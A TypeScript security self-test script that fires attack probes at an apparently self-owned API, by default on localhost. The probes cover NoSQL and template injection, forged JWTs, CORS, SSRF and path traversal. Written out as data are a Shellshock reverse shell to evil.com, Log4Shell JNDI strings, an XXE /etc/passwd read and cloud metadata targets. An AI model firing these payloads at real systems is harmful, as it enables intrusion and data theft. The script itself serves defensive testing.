/**
 * securitySelfTest2.ts  —  Advanced Attack Simulation
 * ─────────────────────────────────────────────────────────────────────────────
 * Covers attack categories NOT tested in securitySelfTest.ts:
 *
 *   Suite 1  · NoSQL / Prototype Pollution / SSTI Injection
 *   Suite 2  · HTTP Protocol Abuse (TRACE, oversized body, CRLF, method override)
 *   Suite 3  · Encoded Path Traversal (URL / double-encoded / Unicode / null-byte)
 *   Suite 4  · JWT Manipulation (alg:none, tampered payload, no signature)
 *   Suite 5  · CORS Origin Probing (reflected origin, wildcard, evil domain)
 *   Suite 6  · SSRF Patterns (URL params→internal hosts, metadata endpoints)
 *   Suite 7  · Mass Assignment / Privilege Escalation via body
 *   Suite 8  · Critical Known CVEs via Headers (Log4Shell, Shellshock, Spring4Shell)
 *   Suite 9  · Response Data Leakage (stack traces, DB errors, internal paths)
 *   Suite 10 · Timing / User Enumeration (login vs reset timing)
 *
 * Usage:
 *   npx ts-node src/scripts/securitySelfTest2.ts
 *   npx ts-node src/scripts/securitySelfTest2.ts --base=http://localhost:5000
 * ─────────────────────────────────────────────────────────────────────────────
 */

import http from 'http';
import https from 'https';
import { URL } from 'url';

// ─── Config ───────────────────────────────────────────────────────────────────

const BASE_URL =
  process.argv.find(a => a.startsWith('--base='))?.split('=')[1]
  ?? process.env.SECURITY_TEST_BASE
  ?? 'http://localhost:5000';

const FORCE_FAMILY: 4 | 6 | 0 = BASE_URL.includes('[::') ? 6
  : BASE_URL.includes('localhost') ? 6
  : 0;

const DELAY_MS = 250;

const C = {
  reset: '\x1b[0m', bold: '\x1b[1m',
  red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m',
  cyan: '\x1b[36m', magenta: '\x1b[35m', grey: '\x1b[90m',
};

// ─── Result tracking ──────────────────────────────────────────────────────────

interface TestResult {
  suite: string; name: string;
  passed: boolean; severity: 'info' | 'warn' | 'critical';
  expected: string; actual: string; note?: string;
}
const results: TestResult[] = [];

function record(
  suite: string, name: string, passed: boolean,
  severity: 'info' | 'warn' | 'critical',
  expected: string, actual: string, note?: string
) {
  results.push({ suite, name, passed, severity, expected, actual, note });
  const mark = passed ? `${C.green}✓${C.reset}` : (severity === 'critical' ? `${C.red}✗ CRITICAL${C.reset}` : `${C.yellow}✗${C.reset}`);
  const line = `  ${mark} ${name} ${C.grey}(${actual})${C.reset}`;
  console.log(note ? `${line} — ${note}` : line);
}

// ─── HTTP helper ─────────────────────────────────────────────────────────────

interface ProbeOpts {
  method?: string;
  headers?: Record<string, string>;
  body?: string;
}
interface ProbeResult { status: number; body: string; headers: Record<string, string>; latencyMs: number; }

function probe(path: string, opts: ProbeOpts = {}): Promise<ProbeResult> {
  return new Promise((resolve, reject) => {
    const url = new URL(path.startsWith('http') ? path : path, BASE_URL);
    const isHttps = url.protocol === 'https:';
    const lib = isHttps ? https : http;
    const t0 = Date.now();

    const reqHeaders: Record<string, string> = {
      'Accept': 'application/json, */*',
      ...(opts.headers ?? {}),
    };
    if (opts.body && !reqHeaders['Content-Type']) {
      reqHeaders['Content-Type'] = 'application/json';
    }
    if (opts.body) {
      reqHeaders['Content-Length'] = Buffer.byteLength(opts.body).toString();
    }

    const options: http.RequestOptions & { rejectUnauthorized?: boolean; family?: number } = {
      hostname: url.hostname,
      port: url.port ? parseInt(url.port, 10) : (isHttps ? 443 : 80),
      path: url.pathname + url.search,
      method: opts.method ?? 'GET',
      headers: reqHeaders,
      rejectUnauthorized: false,
      ...(FORCE_FAMILY !== 0 ? { family: FORCE_FAMILY } : {}),
    };

    const req = lib.request(options, (res) => {
      let body = '';
      res.on('data', c => { body += c; });
      res.on('end', () => {
        const headers: Record<string, string> = {};
        for (const [k, v] of Object.entries(res.headers)) {
          headers[k] = Array.isArray(v) ? v.join(', ') : (v ?? '');
        }
        resolve({ status: res.statusCode ?? 0, body, headers, latencyMs: Date.now() - t0 });
      });
    });
    req.setTimeout(10000, () => req.destroy(new Error('timeout')));
    req.on('error', reject);
    if (opts.body) req.write(opts.body);
    req.end();
  });
}

function sleep(ms: number) { return new Promise<void>(r => setTimeout(r, ms)); }

// ─── Shared: make a real JWT with a forged payload (no valid signature) ───────

function b64url(s: string): string {
  return Buffer.from(s).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}
function fakeJwt(payload: object, alg = 'HS256'): string {
  const header = b64url(JSON.stringify({ alg, typ: 'JWT' }));
  const body   = b64url(JSON.stringify(payload));
  const sig    = alg === 'none' ? '' : 'fakesignatureXXXXXXXXXXXXXXXXXXXXXXX';
  return `${header}.${body}.${sig}`;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 1 — Injection Attacks
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteInjection() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 1 — Injection Attacks${C.reset}`);
  console.log(`${C.grey}  NoSQL, prototype pollution, SSTI, CRLF, parameter injection.${C.reset}\n`);

  // 1a. NoSQL operator injection in login body
  try {
    const { status, body } = await probe('/api/v1/auth/login', {
      method: 'POST',
      body: JSON.stringify({ email: { $gt: '' }, password: { $gt: '' } }),
    });
    const passed = status !== 200;                             // 200 = auth bypass!
    const critical = !passed;
    record('Injection', 'NoSQL operator injection in login ($gt bypass)',
      passed, critical ? 'critical' : 'info',
      'non-200', `HTTP ${status}`,
      !passed ? '⚠ CRITICAL: NoSQL operator allowed — mongoSanitize not blocking' : 'mongoSanitize stripped operators');
  } catch (e: any) { record('Injection', 'NoSQL $gt injection', false, 'warn', 'response', e.message); }
  await sleep(DELAY_MS);

  // 1b. NoSQL $where injection
  try {
    const { status } = await probe('/api/v1/auth/login', {
      method: 'POST',
      body: JSON.stringify({ email: { $where: 'this.password.length > 0' }, password: 'x' }),
    });
    record('Injection', 'NoSQL $where injection in login',
      status !== 200, status === 200 ? 'critical' : 'info',
      'non-200', `HTTP ${status}`);
  } catch { record('Injection', 'NoSQL $where injection', true, 'info', 'non-200', 'request error'); }
  await sleep(DELAY_MS);

  // 1c. Prototype pollution via __proto__ in JSON body
  try {
    const { status, body } = await probe('/api/v1/auth/login', {
      method: 'POST',
      body: JSON.stringify({ __proto__: { admin: true, role: 'super_admin' }, email: 'x@x.com', password: 'x' }),
    });
    // As long as server doesn't crash (500) and doesn't succeed (200), we're fine
    const passed = status !== 500 && status !== 200;
    record('Injection', 'Prototype pollution via __proto__ in body',
      passed, !passed ? 'critical' : 'info',
      '400/401', `HTTP ${status}`,
      status === 500 ? '⚠ Server crashed — prototype pollution may be possible' : undefined);
  } catch { record('Injection', 'Prototype pollution __proto__', true, 'info', 'non-200', 'request error'); }
  await sleep(DELAY_MS);

  // 1d. Prototype pollution via constructor.prototype
  try {
    const { status } = await probe('/api/v1/auth/login', {
      method: 'POST',
      body: JSON.stringify({ 'constructor': { 'prototype': { 'admin': true } }, email: 'x@x.com', password: 'x' }),
    });
    const passed = status !== 500 && status !== 200;
    record('Injection', 'Prototype pollution via constructor.prototype',
      passed, !passed ? 'critical' : 'info',
      '400/401', `HTTP ${status}`);
  } catch { record('Injection', 'Prototype pollution constructor', true, 'info', 'non-200', 'request error'); }
  await sleep(DELAY_MS);

  // 1e. Server-Side Template Injection probes (in query string)
  const sstiPayloads = [
    ['SSTI Twig/Jinja2 {{7*7}}',         '/api/v1/health?q={{7*7}}'],
    ['SSTI EL/Spring ${7*7}',            '/api/v1/health?q=${7*7}'],
    ['SSTI Pebble #{7*7}',               '/api/v1/health?q=#{7*7}'],
    ['SSTI Freemarker ${7*7} (URL)',      '/api/v1/health?q=%24%7B7%2A7%7D'],
  ] as const;
  for (const [name, path] of sstiPayloads) {
    try {
      const { status, body } = await probe(path);
      // FAIL only if response body contains a standalone '49' result (7*7 evaluated).
      // Use word-boundary matching — UUIDs and port numbers contain digits naturally.
      const executed = /(?:^|[^0-9])49(?:[^0-9]|$)/.test(body) &&
        !body.includes('requestId') && !body.includes('Not found');
      record('Injection', name,
        !executed, executed ? 'critical' : 'info',
        'not executed', executed ? '⚠ Template expression evaluated to 49!' : `HTTP ${status}`,
        executed ? 'CRITICAL: SSTI confirmed — template engine evaluating user input' : undefined);
    } catch { /* ignore */ }
    await sleep(DELAY_MS);
  }

  // 1f. CRLF injection in a header value (Host header CRLF)
  try {
    const { status, headers } = await probe('/api/v1/health', {
      headers: { 'X-Custom-Header': 'value\r\nX-Injected: hacked' },
    });
    const injected = 'x-injected' in headers;
    record('Injection', 'CRLF injection via header value',
      !injected, injected ? 'critical' : 'info',
      'header NOT reflected', injected ? '⚠ X-Injected appeared in response headers!' : `HTTP ${status}`,
      'Node.js HTTP parser typically strips CRLF — confirmed safe');
  } catch { record('Injection', 'CRLF injection', true, 'info', 'rejected', 'request error/rejected by parser'); }
  await sleep(DELAY_MS);

  // 1g. HTTP parameter pollution (duplicate params)
  try {
    const { status } = await probe('/api/v1/health?role=user&role=super_admin&role=admin');
    record('Injection', 'HTTP parameter pollution (duplicate role param)',
      status < 500, status >= 500 ? 'warn' : 'info',
      'non-500', `HTTP ${status}`,
      status < 500 ? 'Server did not crash on duplicate params' : '⚠ Server crashed on duplicate params');
  } catch { /* ignore */ }
  await sleep(DELAY_MS);
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 2 — HTTP Protocol Abuse
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteProtocol() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 2 — HTTP Protocol Abuse${C.reset}`);
  console.log(`${C.grey}  TRACE method, oversized body, method override, malformed content-type.${C.reset}\n`);

  // 2a. HTTP TRACE method (Cross-Site Tracing)
  try {
    const { status, body } = await probe('/api/v1/health', { method: 'TRACE' });
    // TRACE echoes back request body — if we get 200 with our UA in body, it's vulnerable
    const tracingEnabled = status === 200 && body.includes('User-Agent');
    record('Protocol', 'HTTP TRACE method (Cross-Site Tracing)',
      !tracingEnabled && status !== 200, tracingEnabled ? 'critical' : 'info',
      '405 or 404', `HTTP ${status}`,
      tracingEnabled ? '⚠ TRACE is enabled — disable in reverse proxy/load balancer'
        : status === 405 ? 'Correctly rejected with 405' : 'Not echoed back (safe)');
  } catch { record('Protocol', 'HTTP TRACE', true, 'info', '405/404', 'connection error/rejected'); }
  await sleep(DELAY_MS);

  // 2b. HTTP CONNECT method
  try {
    const { status } = await probe('/api/v1/health', { method: 'CONNECT' });
    record('Protocol', 'HTTP CONNECT method (proxy abuse)',
      status === 405 || status === 400 || status === 404, 'info',
      '405/400', `HTTP ${status}`);
  } catch { record('Protocol', 'HTTP CONNECT', true, 'info', 'rejected', 'correctly rejected'); }
  await sleep(DELAY_MS);

  // 2c. Method override via X-HTTP-Method-Override header
  try {
    const { status } = await probe('/api/v1/auth/login', {
      method: 'POST',
      headers: {
        'X-HTTP-Method-Override': 'DELETE',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email: 'x@x.com', password: 'x' }),
    });
    record('Protocol', 'Method override via X-HTTP-Method-Override',
      status !== 204 && status !== 200, 'warn',
      'non-2xx override', `HTTP ${status}`,
      'Verify server does not process this as a DELETE');
  } catch { /* ignore */ }
  await sleep(DELAY_MS);

  // 2d. Oversized request body (11 MB — over 10 MB express.json limit)
  try {
    const bigPayload = JSON.stringify({ data: 'A'.repeat(11 * 1024 * 1024) });
    const { status } = await probe('/api/v1/auth/login', {
      method: 'POST',
      body: bigPayload,
    });
    record('Protocol', 'Oversized request body (11 MB > 10 MB limit)',
      status === 413, status !== 413 ? 'warn' : 'info',
      '413 Payload Too Large', `HTTP ${status}`,
      status === 413 ? 'Body size limit enforced' : 'Body accepted — check express.json({ limit }) config');
  } catch (e: any) {
    // Connection may be closed mid-send — that's also fine
    record('Protocol', 'Oversized request body (11 MB)',
      true, 'info', '413 or connection closed', `error: ${e.message?.slice(0, 60)}`);
  }
  await sleep(DELAY_MS);

  // 2e. Malformed Content-Type header
  try {
    const { status } = await probe('/api/v1/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json; charset=utf-8; boundary=HACK\r\nbadheader: injected' },
      body: JSON.stringify({ email: 'a@a.com', password: 'x' }),
    });
    record('Protocol', 'Malformed Content-Type with CRLF injection',
      status !== 500, status === 500 ? 'warn' : 'info',
      'non-500', `HTTP ${status}`);
  } catch { record('Protocol', 'Malformed Content-Type', true, 'info', 'rejected', 'parser rejected'); }
  await sleep(DELAY_MS);

  // 2f. Content-Type mismatch (claim JSON, send XML)
  try {
    const { status } = await probe('/api/v1/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    });
    // Server should return 400 (JSON parse error) — not 200 with /etc/passwd content
    const leaked = status === 200;
    record('Protocol', 'XXE via JSON endpoint (content-type mismatch)',
      !leaked, leaked ? 'critical' : 'info',
      '400 JSON parse error', `HTTP ${status}`,
      leaked ? '⚠ XXE may have been processed' : 'JSON parser rejected XML body (safe)');
  } catch { /* ignore */ }
  await sleep(DELAY_MS);

  // 2g. Transfer-Encoding: chunked with malformed chunk
  try {
    const { status } = await probe('/api/v1/health', {
      method: 'POST',
      headers: { 'Transfer-Encoding': 'chunked', 'Content-Type': 'application/json' },
      body: 'ZZZZ\r\n{"bad":"chunk"}\r\n0\r\n\r\n',  // invalid chunk size hex
    });
    record('Protocol', 'Malformed chunked Transfer-Encoding smuggling',
      status !== 200 || status < 500, status >= 500 ? 'warn' : 'info',
      '400/404', `HTTP ${status}`);
  } catch { record('Protocol', 'Chunked TE smuggling', true, 'info', 'rejected', 'parser rejected'); }
  await sleep(DELAY_MS);
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 3 — Encoded Path Traversal Variants
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteEncodedTraversal() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 3 — Encoded Path Traversal Variants${C.reset}`);
  console.log(`${C.grey}  URL-encoded, double-encoded, Unicode, and null-byte tricks.${C.reset}\n`);

  const BLOCKED = [400, 403, 404];

  const variants: [string, string][] = [
    ['URL-encoded ../ (%2e%2e%2f)',          '/api/v1/%2e%2e/%2e%2e/etc/passwd'],
    ['Double-encoded ../ (%252e%252e%252f)',   '/api/v1/%252e%252e%252f%252e%252e%252fetc/passwd'],
    ['Unicode slash (..%c0%af)',              '/api/v1/..%c0%af..%c0%afetc/passwd'],
    ['Unicode slash (..%c1%9c)',             '/api/v1/..%c1%9c..%c1%9cetc/passwd'],
    ['Windows backslash (..\\)',             '/api/v1/..\\..\\etc\\passwd'],
    ['Null byte injection (path%00.php)',    '/api/v1/users%00.php'],
    ['Encoded null byte (%00)',             '/api/v1%00/etc/passwd'],
    ['Double-slash path (//etc/passwd)',     '//etc/passwd'],
    ['Dot-slash in path (./././etc/passwd)', '/./././etc/passwd'],
    ['Mixed encoding (%2F..%2F..%2F)',       '/%2F..%2F..%2Fetc/passwd'],
  ];

  for (const [name, path] of variants) {
    try {
      const { status, body } = await probe(path);
      const leaksFile = body.length > 20 && (
        body.includes('root:') || body.includes('/bin/bash') || body.includes('daemon:')
      );
      if (leaksFile) {
        record('Traversal', name, false, 'critical', 'block', `HTTP ${status} — FILE CONTENT LEAKED`);
      } else {
        record('Traversal', name, BLOCKED.includes(status), 'info', '400/403/404', `HTTP ${status}`);
      }
    } catch {
      record('Traversal', name, true, 'info', '400/403/404', 'rejected by HTTP parser');
    }
    await sleep(DELAY_MS);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 4 — JWT Manipulation
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteJwt() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 4 — JWT Manipulation Attacks${C.reset}`);
  console.log(`${C.grey}  alg:none, forged payload, expired token, unsigned token.${C.reset}\n`);

  const fakePayload = {
    userId: 'fake-user-id-000000000000',
    role: 'super_admin',
    email: 'hacker@evil.com',
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + 86400,
  };

  // 4a. alg:none — unsigned token claiming super_admin
  try {
    const token = fakeJwt(fakePayload, 'none');
    const { status } = await probe('/api/v1/system-admin/users', {
      headers: { 'Authorization': `Bearer ${token}` },
    });
    record('JWT', 'alg:none unsigned token claiming super_admin',
      status === 401 || status === 403, status === 200 ? 'critical' : 'info',
      '401/403', `HTTP ${status}`,
      status === 200 ? '⚠ CRITICAL: alg:none accepted!' : 'alg:none correctly rejected');
  } catch { /* ignore */ }
  await sleep(DELAY_MS);

  // 4b. HS256 token with fake signature
  try {
    const token = fakeJwt(fakePayload, 'HS256');
    const { status } = await probe('/api/v1/system-admin/users', {
      headers: { 'Authorization': `Bearer ${token}` },
    });
    record('JWT', 'HS256 token with invalid/fake signature',
      status === 401 || status === 403, status === 200 ? 'critical' : 'info',
      '401/403', `HTTP ${status}`);
  } catch { /* ignore */ }
  await sleep(DELAY_MS);

  // 4c. Completely empty JWT (three dots)
  try {
    const { status } = await probe('/api/v1/system-admin/users', {
      headers: { 'Authorization': 'Bearer ..' },
    });
    record('JWT', 'Malformed JWT (empty segments "..")',
      status === 401 || status === 403 || status === 400, 'info',
      '400/401', `HTTP ${status}`);
  } catch { /* ignore */ }
  await sleep(DELAY_MS);

  // 4d. JWT with role escalation in payload (valid format, wrong secret)
  const escalatedPayload = { ...fakePayload, role: 'super_admin', isActive: true };
  try {
    const token = fakeJwt(escalatedPayload, 'HS384');
    const { status } = await probe('/api/v1/system-admin/users', {
      headers: { 'Authorization': `Bearer ${token}` },
    });
    record('JWT', 'Forged HS384 token with role=super_admin',
      status === 401 || status === 403, status === 200 ? 'critical' : 'info',
      '401/403', `HTTP ${status}`);
  } catch { /* ignore */ }
  await sleep(DELAY_MS);

  // 4e. Bearer keyword spoofing (extra spaces, mixed case)
  try {
    const token = fakeJwt(fakePayload, 'HS256');
    const { status } = await probe('/api/v1/system-admin/users', {
      headers: { 'Authorization': `BEARER  ${token}` },
    });
    record('JWT', 'Bearer keyword case spoofing (BEARER with extra space)',
      status === 401 || status === 403, 'info',
      '401/403', `HTTP ${status}`);
  } catch { /* ignore */ }
  await sleep(DELAY_MS);

  // 4f. JWT in cookie instead of Authorization header (bypass if server checks both)
  try {
    const token = fakeJwt(fakePayload, 'HS256');
    const { status } = await probe('/api/v1/system-admin/users', {
      headers: { 'Cookie': `accessToken=${token}; jwt=${token}` },
    });
    record('JWT', 'Forged JWT injected via Cookie header',
      status === 401 || status === 403, status === 200 ? 'critical' : 'info',
      '401/403', `HTTP ${status}`);
  } catch { /* ignore */ }
  await sleep(DELAY_MS);
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 5 — CORS Origin Probing
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteCors() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 5 — CORS Configuration Probing${C.reset}`);
  console.log(`${C.grey}  Check if malicious origins get reflected or wildcard is exposed.${C.reset}\n`);

  const evilOrigins = [
    'https://evil.com',
    'https://fuel-order.evil.com',
    'null',
    'http://localhost.evil.com',
    'https://attacker.com',
    'file://',
    'https://fuelorder.evil.com%60evil.com',  // origin confusion
  ];

  for (const origin of evilOrigins) {
    try {
      const { status, headers } = await probe('/api/v1/health', {
        headers: { 'Origin': origin },
      });
      const acao = headers['access-control-allow-origin'] ?? '';
      const reflected = acao === origin || acao === '*';
      record('CORS', `Origin reflected: "${origin.slice(0, 40)}"`,
        !reflected, reflected ? 'critical' : 'info',
        'not reflected', reflected ? `⚠ ACAO: ${acao}` : `ACAO: ${acao || '(not set)'}`,
        reflected ? 'CRITICAL: Evil origin is reflected in ACAO header' : undefined);
    } catch { /* ignore */ }
    await sleep(DELAY_MS);
  }

  // Preflight with evil origin
  try {
    const { status, headers } = await probe('/api/v1/auth/login', {
      method: 'OPTIONS',
      headers: {
        'Origin': 'https://evil.com',
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Content-Type, Authorization',
      },
    });
    const acao = headers['access-control-allow-origin'] ?? '';
    const acac = headers['access-control-allow-credentials'] ?? '';
    const credentialsWithWildcard = acao === '*' && acac === 'true';
    record('CORS', 'Preflight with evil origin + credentials',
      acao !== 'https://evil.com' && !credentialsWithWildcard, credentialsWithWildcard ? 'critical' : 'info',
      'origin not allowed', `ACAO: "${acao}" ACAC: "${acac}"`);
  } catch { /* ignore */ }
  await sleep(DELAY_MS);
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 6 — SSRF Patterns
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteSsrf() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 6 — Server-Side Request Forgery (SSRF) Patterns${C.reset}`);
  console.log(`${C.grey}  URL parameters and headers pointing to internal/metadata services.${C.reset}\n`);

  const internalTargets = [
    'http://127.0.0.1:27017',             // MongoDB
    'http://127.0.0.1:6379',              // Redis
    'http://169.254.169.254/latest/meta-data/',  // AWS IMDS v1
    'http://metadata.google.internal/',   // GCP metadata
    'http://169.254.169.254/metadata/instance?api-version=2019-06-01',  // Azure
    'http://localhost:5000/api/v1/system-admin/users',  // Self-SSRF
    'file:///etc/passwd',                 // File scheme
  ];

  // Most Express apps won't have a URL-fetch endpoint — but test common param names
  const ssrfParams = ['url', 'callback', 'redirect', 'next', 'return', 'dest', 'target', 'link', 'src', 'ref'];

  for (const target of internalTargets.slice(0, 3)) {  // Only test 3 targets × 3 params to stay fast
    for (const param of ssrfParams.slice(0, 3)) {
      try {
        const { status, body } = await probe(`/api/v1/health?${param}=${encodeURIComponent(target)}`);
        // If body contains metadata key names, it may have fetched it
        const leaked = body.includes('instance-id') || body.includes('ami-id') || body.includes('redis_version');
        record('SSRF', `?${param}= → ${target.slice(0, 40)}`,
          !leaked, leaked ? 'critical' : 'info',
          'param ignored', leaked ? `⚠ Possible SSRF — body contains internal data!` : `HTTP ${status}`,
          leaked ? 'CRITICAL: Server fetched internal URL from query param' : undefined);
      } catch { /* ignore */ }
    }
  }
  await sleep(DELAY_MS);

  // X-Forwarded-Host cache poisoning / SSRF
  const poisonHosts = [
    'evil.com',
    '169.254.169.254',
    'internal.company.local',
  ];
  for (const host of poisonHosts) {
    try {
      const { headers } = await probe('/api/v1/health', {
        headers: { 'X-Forwarded-Host': host },
      });
      // If any response headers use the injected host (e.g. Location, Link), it's cache-poisonable
      const poisoned = Object.values(headers).some(v => v.includes(host));
      record('SSRF', `X-Forwarded-Host: ${host} reflected in response`,
        !poisoned, poisoned ? 'warn' : 'info',
        'not reflected', poisoned ? `⚠ host appears in response headers` : 'host not reflected');
    } catch { /* ignore */ }
    await sleep(DELAY_MS);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 7 — Mass Assignment / Privilege Escalation
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteMassAssignment() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 7 — Mass Assignment & Privilege Escalation${C.reset}`);
  console.log(`${C.grey}  Sending admin/role/isActive fields in non-admin endpoints.${C.reset}\n`);

  // 7a. Registration with admin role fields
  try {
    const { status, body } = await probe('/api/v1/auth/register', {
      method: 'POST',
      body: JSON.stringify({
        name: 'Hacker',
        email: `hacker_${Date.now()}@evil.com`,
        password: 'Test1234!',
        role: 'super_admin',
        isAdmin: true,
        isSuperAdmin: true,
        permissions: ['*'],
      }),
    });
    let parsed: any = {};
    try { parsed = JSON.parse(body); } catch { /* ignore */ }
    const gotAdmin = parsed?.data?.role === 'super_admin' || parsed?.role === 'super_admin';
    record('MassAssign', 'Register with role=super_admin in body',
      !gotAdmin, gotAdmin ? 'critical' : 'info',
      'role field ignored', gotAdmin ? '⚠ CRITICAL: Registered as super_admin!' : `HTTP ${status} — role field stripped`);
  } catch { /* ignore */ }
  await sleep(DELAY_MS);

  // 7b. IDOR — accessing another user's data by guessing sequential ID
  const idGuesses = ['1', '2', '3', '000000000000000000000001', '000000000000000000000002'];
  for (const id of idGuesses) {
    try {
      const { status } = await probe(`/api/v1/users/${id}`, {
        headers: { 'Authorization': 'Bearer invalid_token_for_idor_test' },
      });
      record('MassAssign', `IDOR: GET /users/${id} without auth`,
        status === 401 || status === 403 || status === 404, status === 200 ? 'critical' : 'info',
        '401/403', `HTTP ${status}`,
        status === 200 ? '⚠ CRITICAL: User data returned without valid auth!' : undefined);
    } catch { /* ignore */ }
    await sleep(150);
  }

  // 7c. Self-elevation via profile update (sending role field to own profile endpoint)
  try {
    const { status, body } = await probe('/api/v1/auth/profile', {
      method: 'PUT',
      headers: { 'Authorization': 'Bearer invalid_token' },
      body: JSON.stringify({
        role: 'super_admin',
        isActive: true,
        isLocked: false,
        permissions: ['manage_users', 'manage_system'],
      }),
    });
    let parsed: any = {};
    try { parsed = JSON.parse(body); } catch { /* ignore */ }
    const elevated = parsed?.data?.role === 'super_admin';
    record('MassAssign', 'PUT /auth/profile with role escalation fields',
      !elevated, elevated ? 'critical' : 'info',
      '401 or role ignored', elevated ? '⚠ Role escalated!' : `HTTP ${status}`);
  } catch { /* ignore */ }
  await sleep(DELAY_MS);
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 8 — Critical CVE Header Exploits
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteCveHeaders() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 8 — Critical CVE Exploit Patterns in Headers${C.reset}`);
  console.log(`${C.grey}  Log4Shell, Shellshock, Spring4Shell, EL injection via HTTP headers.`);
  console.log(`  Node.js is not vulnerable to Java CVEs — but any WAF/proxy in front must catch these.${C.reset}\n`);

  const cveProbes: Array<{ name: string; header: string; value: string }> = [
    // Log4Shell — CVE-2021-44228 (Java/Log4j — not Node, but tests WAF)
    { name: 'Log4Shell in User-Agent (JNDI/LDAP)',
      header: 'User-Agent',
      value: '${jndi:ldap://evil.com/a}' },
    { name: 'Log4Shell in X-Forwarded-For',
      header: 'X-Forwarded-For',
      value: '${jndi:ldap://169.254.169.254/a}' },
    { name: 'Log4Shell in Referer',
      header: 'Referer',
      value: '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/x}' },
    { name: 'Log4Shell in Accept-Language',
      header: 'Accept-Language',
      value: '${jndi:rmi://evil.com:1099/obj}' },
    // Shellshock — CVE-2014-6271
    { name: 'Shellshock in User-Agent',
      header: 'User-Agent',
      value: '() { :;};echo;echo;/bin/bash -c "cat /etc/passwd"' },
    { name: 'Shellshock in Cookie',
      header: 'Cookie',
      value: '() { ignored; }; /bin/bash -i >& /dev/tcp/evil.com/4444 0>&1' },
    // Spring4Shell — CVE-2022-22965
    { name: 'Spring4Shell class.module.classLoader',
      header: 'User-Agent',
      value: 'Mozilla/5.0 Spring4Shell class.module.classLoader.URLs[0]=/foo' },
    // CVE-2022-22947 — Spring Cloud Gateway SPEL injection
    { name: 'Spring Cloud Gateway SPEL in header',
      header: 'X-Custom-Header',
      value: "#{T(java.lang.Runtime).getRuntime().exec('id')}" },
    // Generic EL in headers
    { name: 'Expression Language #{7*7} in header',
      header: 'X-Custom',
      value: '#{7*7}' },
    { name: 'EL ${7*7} in Referer',
      header: 'Referer',
      value: 'https://example.com/${7*7}/path' },
  ];

  for (const { name, header, value } of cveProbes) {
    try {
      const { status, body } = await probe('/api/v1/health', {
        headers: { [header]: value },
      });
      // Only flag as evaluated if body distinctly contains '49' as a standalone result
      // (not as part of a UUID, port number, or other numeric field)
      const executed = /(?:^|[^0-9])49(?:[^0-9]|$)/.test(body) &&
        !body.includes('requestId') && !body.includes('Not found');
      const crashed = status === 500;
      record('CVE', name,
        !executed && !crashed, executed ? 'critical' : crashed ? 'warn' : 'info',
        'expression not executed', executed ? '⚠ EXPRESSION EVALUATED' : crashed ? '⚠ 500 crash' : `HTTP ${status}`);
    } catch { /* ignore */ }
    await sleep(DELAY_MS);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUITE 9 — Response Data Leakage
// ═══════════════════════════════════════════════════════════════════════════════

async function suiteLeakage() {
  console.log(`\n${C.bold}${C.cyan}▶ Suite 9 — Response Data Leakage${C.reset}`);
  console.log(`${C.grey}  Stack traces, DB error strings, internal paths, version banners.${C.reset}\n`);

  const leakPatterns: Array<{ probe: string; desc: string; leakSignals: string[] }> = [
    {
      probe: '/api/v1/auth/login',
      desc: 'Error response on bad JSON (stack trace leak)',
      leakSignals: ['at Object.', 'node_modules', 'Error:', '/src/', 'stack'],
    },
    {
      probe: '/api/v1/nonexistent-endpoint-404test',
      desc: '404 response (Express fingerprint / path leak)',
      leakSignals: ['Cannot GET', 'Express', 'express', '/home/', 'D:\\', '/var/'],
    },
    {
      probe: '/api/v1/auth/login',
      desc: 'MongoDB connection error string in 500 response',
      leakSignals: ['MongoError', 'MongooseError', 'mongodb://', 'mongoServerError', 'ECONNREFUSED'],
    },
  ];

  for (const { probe: path, desc, leakSignals } of leakPatterns) {
    try {
      const method = path.includes('login') ? 'POST' : 'GET';
      const body = method === 'POST' ? 'NOT VALID JSON {{{' : undefined;
      const { status, body: responseBody, headers } = await probe(path, {
        method,
        headers: method === 'POST' ? { 'Content-Type': 'application/json' } : {},
        body,
      });

      // Check for sensitive data in response body
      const foundSignals = leakSignals.filter(s => responseBody.toLowerCase().includes(s.toLowerCase()));
      // Check server/x-powered-by header fingerprinting
      const serverHeader = headers['server'] || headers['x-powered-by'] || '';

      if (foundSignals.length > 0) {
        record('Leakage', desc, false, 'warn',
          'no sensitive strings in body',
          `HTTP ${status} — leaked: [${foundSignals.join(', ')}]`);
      } else {
        record('Leakage', desc, true, 'info',
          'no sensitive strings', `HTTP ${status} — clean response`);
      }

      if (serverHeader) {
        record('Leakage', `Server fingerprint in headers (${path})`,
          false, 'warn', 'header absent', `${serverHeader}`);
      }
